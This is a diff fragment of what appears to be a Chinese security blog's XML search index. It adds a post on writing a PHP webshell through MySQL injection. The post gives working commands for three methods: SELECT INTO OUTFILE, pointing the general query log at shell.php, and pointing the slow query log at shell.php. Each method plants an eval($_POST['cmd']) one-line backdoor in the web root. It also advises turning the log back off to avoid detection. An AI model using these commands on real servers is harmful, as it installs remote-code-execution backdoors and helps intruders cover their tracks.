-SHOW VARIABLES LIKE &#x27;%slow_query_log%&#x27;;
-
-开启慢查询日志并设置日志路径：
-SET GLOBAL slow_query_log = &#x27;ON&#x27;;SET GLOBAL slow_query_log_file = &#x27;C:/phpStudy/WWW/shell.php&#x27;;
-
-执行一条耗时查询并注入 WebShell：
-SELECT &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27; OR SLEEP(11);
-
-验证文件是否成功生成，并关闭慢查询日志。
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>getshell</tag>
       </tags>
   </entry>
   <entry>
@@ -4321,6 +4489,54 @@ POC（报错注入）:
       <tags>
         <tag>SQL注入</tag>
         <tag>预编译</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL 注入写 shell</title>
+    <url>/2026/08/14/sql-injection-write-shell/</url>
+    <content><![CDATA[通过 MySQL 写入 WebShell 是一种常见的安全测试技术，通常需要特定权限和配置。
+方法 1：使用 OUTFILE 写入 Shell原理：把 SELECT 查询结果写入文件。
+条件：
+数据库用户具有 FILE 权限。
+知道目标网站的绝对路径，并且该路径具有写入权限。
+secure_file_priv 参数未限制写入路径。
+
+执行以下 SQL 语句，将一句话木马写入文件：
+SELECT &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27; INTO OUTFILE &#x27;C:/phpStudy/WWW/shell.php&#x27;;
+
+验证文件是否成功写入，并通过 Web 访问测试。
+注意：OUTFILE 会在每行末尾添加换行符，适合写文本文件。
+如果路径受限，可尝试修改 MySQL 配置文件中的 secure_file_priv 参数。
+方法 2：利用全局日志写入 Shell原理：开启 MySQL 通用日志（general log），把日志文件路径改成网站目录下的 .php，然后执行一句带木马的 SQL，日志里就有木马了。
+步骤：检查全局日志是否开启：
+SHOW VARIABLES LIKE &#x27;%general_log%&#x27;;
+
+开启全局日志并设置日志路径为目标目录：
+SET GLOBAL general_log = &#x27;ON&#x27;;SET GLOBAL general_log_file = &#x27;C:/phpStudy/WWW/shell.php&#x27;;
+
+执行一条包含 WebShell 的查询语句：
+SELECT &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;;
+
+恢复原始日志配置以避免被发现：
+SET GLOBAL general_log = &#x27;OFF&#x27;;
+
+方法 3：通过慢查询日志写入 Shell步骤：检查慢查询日志是否开启：
+SHOW VARIABLES LIKE &#x27;%slow_query_log%&#x27;;
+
+开启慢查询日志并设置日志路径：
+SET GLOBAL slow_query_log = &#x27;ON&#x27;;SET GLOBAL slow_query_log_file = &#x27;C:/phpStudy/WWW/shell.php&#x27;;
+
+执行一条耗时查询并注入 WebShell：
+SELECT &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27; OR SLEEP(11);
+
+验证文件是否成功生成，并关闭慢查询日志。
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>getshell</tag>
       </tags>
   </entry>
   <entry>
